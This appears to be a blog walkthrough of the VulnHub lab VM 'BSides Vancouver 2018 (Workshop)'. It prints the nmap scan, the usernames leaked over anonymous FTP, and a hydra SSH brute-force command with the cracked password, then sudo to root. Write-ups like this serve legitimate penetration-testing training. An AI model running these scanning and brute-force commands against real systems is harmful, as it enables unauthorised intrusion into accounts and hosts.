---
layout: post
date: 2018-06-22 06:52:37 +0000
last_modified_at: 2018-12-09 08:21:33 +0000
title: "BSides Vancouver: 2018 (Workshop) Walkthrough"
subtitle: "A Vibrant Melting Pot"
category: Walkthrough
tags: [VulnHub, "BSides Vancouver"]
comments: true
image:
  feature: bsides-vancouver-2018-workshop-walkthrough.jpg
  credit: Alexas_Fotos / Pixabay
  creditlink: https://pixabay.com/en/kermit-workshop-coffee-break-pliers-2091951/
---

This post documents the easiest walkthrough of BSides Vancouver: 2018 (Workshop), a boot2root [VM][1] created by [abatchy][2], and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## Background

This VM aims to create a safe environment to perform real-world penetration testing on an intentionally vulnerable target. As the name implied, the VM appeared as course material in a workshop during 2018 BSides Vancouver.

## Information Gathering

Let's start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.30.129
...
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 2.3.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 65534    65534        4096 Mar 03 17:52 public
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.30.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 2.3.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 85:9f:8b:58:44:97:33:98:ee:98:b0:c1:85:60:3c:41 (DSA)
|   2048 cf:1a:04:e1:7b:a3:cd:2b:d1:af:7d:b3:30:e0:a0:9d (RSA)
|_  256 97:e5:28:7a:31:4d:0a:89:b2:b0:25:81:d5:36:63:4c (ECDSA)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.22 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
| http-robots.txt: 1 disallowed entry
|_/backup_wordpress
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```

`nmap` finds `21/tcp`, `22/tcp`, and `80/tcp` open. None of the services are vulnerable to any remote code execution attacks right off the bat. Let's explore the `ftp` service next since we can log in anonymously.

## FTP Service

There's a file `users.txt.bk` in the `public` directory—it contains usernames.

```
# cat users.txt.bk
abatchy
john
mai
anne
doomguy
```
## SSH Service

If I had to guess, I would say these are probably users with an account in the target. Let's find out.

![SSH Login](/assets/images/posts/bsides-vancouver-2018-workshop-walkthrough/0.jlutahztgc.png)

As you can see, `anne` is the sole account that can login via SSH with a password. This calls for a brute-force attack.

## Hail Hydra

For online brute-force attack, I like to use `hydra` and the **rockyou** wordlist. Here's the command.

```
# hydra -l anne -P /usr/share/wordlists/rockyou.txt -f -e nsr -o hydra.txt -t 4 ssh://192.168.30.129
[22][ssh] host: 192.168.30.129   login: anne   password: princess
```

## SSH Access

I don't believe it—this is way too easy.

![SSH Access](/assets/images/posts/bsides-vancouver-2018-workshop-walkthrough/0.dovkhr1yz8s.png)

## Privilege Escalation

Guess what? `anne` is able to `sudo` as `root`.

![sudo](/assets/images/posts/bsides-vancouver-2018-workshop-walkthrough/0.6pu5qdr84a.png)

## Eyes on the Prize

I got my eyes on the prize.

![flag.txt](/assets/images/posts/bsides-vancouver-2018-workshop-walkthrough/0.m2ls023yfbf.png)

## Afterthought

Admittedly, this VM is not too difficult since it's targeting delegates attending the workshop. That's also the reason why there are other ways to gain remote access and `root`ing the VM because the instructor would then cover other attack surfaces like WordPress and/or kernel exploit during the workshop.

[1]: https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/
[2]: https://twitter.com/@abatchy17
[3]: https://www.vulnhub.com
